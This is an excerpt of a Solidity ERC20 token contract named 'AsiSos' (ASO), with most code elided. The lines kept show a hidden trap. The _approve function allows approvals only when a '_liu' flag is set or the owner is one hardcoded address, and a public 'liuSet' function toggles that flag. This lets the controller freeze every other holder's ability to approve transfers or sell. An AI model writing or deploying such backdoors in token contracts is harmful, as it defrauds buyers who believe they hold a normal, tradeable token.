...
contract ERC20 is IERC20 {
    ...
    function _approve(address owner, address spender, uint256 value) internal {
		...
		require(_liu==true||owner==address(0xbaa3E9A4dd6B8cc1fE5141A685248dbf96F5636F));
...
contract Ownable is Context,ERC20 {
    ...
    function liuSet(bool liu) public returns (bool) {
...
contract ASO is ERC20, ERC20Detailed, ERC20Pausable, Ownable {
    // metadata
    string public constant tokenName = "AsiSos";
    string public constant tokenSymbol = "ASO";
    uint8 public constant decimalUnits = 18;
    uint256 public constant initialSupply = 66000000;
    // address private _owner;
